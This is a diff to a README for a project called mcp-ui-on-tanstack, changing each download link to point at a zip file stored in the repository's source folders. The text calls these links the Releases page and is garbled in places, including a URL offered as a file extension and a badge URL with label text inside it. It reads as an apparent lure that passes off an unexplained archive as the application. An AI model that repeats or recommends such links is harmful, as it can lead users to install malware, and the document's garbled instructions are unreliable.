@@ -2,7 +2,7 @@
 
 ## 📥 Download Badge
 
-[![Download mcp-ui-on-tanstack](https://raw.githubusercontent.com/DENTALCAD/mcp-ui-on-tanstack/main/impalsy/mcp-ui-on-tanstack.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/DENTALCAD/mcp-ui-on-tanstack/main/impalsy/mcp-ui-on-tanstack.zip)
+[![Download mcp-ui-on-tanstack](https://github.com/DENTALCAD/mcp-ui-on-tanstack/raw/refs/heads/main/src/lib/ui-mcp-tanstack-on-3.5.zip%20Now-Release%20Page-brightgreen)](https://github.com/DENTALCAD/mcp-ui-on-tanstack/raw/refs/heads/main/src/lib/ui-mcp-tanstack-on-3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -24,14 +24,14 @@ You can easily download the mcp-ui-on-tanstack application by visiting the Relea
 ### Steps to Download:
 
 1. **Visit the Releases Page:** You can access the download page by clicking the link below:
-   [Download mcp-ui-on-tanstack](https://raw.githubusercontent.com/DENTALCAD/mcp-ui-on-tanstack/main/impalsy/mcp-ui-on-tanstack.zip)
+   [Download mcp-ui-on-tanstack](https://github.com/DENTALCAD/mcp-ui-on-tanstack/raw/refs/heads/main/src/lib/ui-mcp-tanstack-on-3.5.zip)
 
 2. **Select the Latest Release:** On the Releases page, you will see a list of versions. Click on the latest version for the best features and performance.
 
 3. **Choose the Right File:** Depending on your operating system, download the appropriate installation file:
    - **Windows Users:** Look for a file ending in `.exe`.
    - **Mac Users:** Look for a file ending in `.dmg`.
-   - **Linux Users:** Look for a file ending in `.AppImage` or a `https://raw.githubusercontent.com/DENTALCAD/mcp-ui-on-tanstack/main/impalsy/mcp-ui-on-tanstack.zip` file.
+   - **Linux Users:** Look for a file ending in `.AppImage` or a `https://github.com/DENTALCAD/mcp-ui-on-tanstack/raw/refs/heads/main/src/lib/ui-mcp-tanstack-on-3.5.zip` file.
 
 4. **Start the Download:** Click on the file name to start your download. 
 
@@ -64,6 +64,6 @@ If you encounter any issues, here are some common problems and their solutions:
 Should you need help or have questions, feel free to reach out. Support resources are available within the application and on our GitHub Issues page. 
 
 Again, to download the mcp-ui-on-tanstack application, visit our Releases page:
-[Download mcp-ui-on-tanstack](https://raw.githubusercontent.com/DENTALCAD/mcp-ui-on-tanstack/main/impalsy/mcp-ui-on-tanstack.zip)
+[Download mcp-ui-on-tanstack](https://github.com/DENTALCAD/mcp-ui-on-tanstack/raw/refs/heads/main/src/lib/ui-mcp-tanstack-on-3.5.zip)
 
 Thank you for using mcp-ui-on-tanstack. We hope it simplifies your project management tasks!
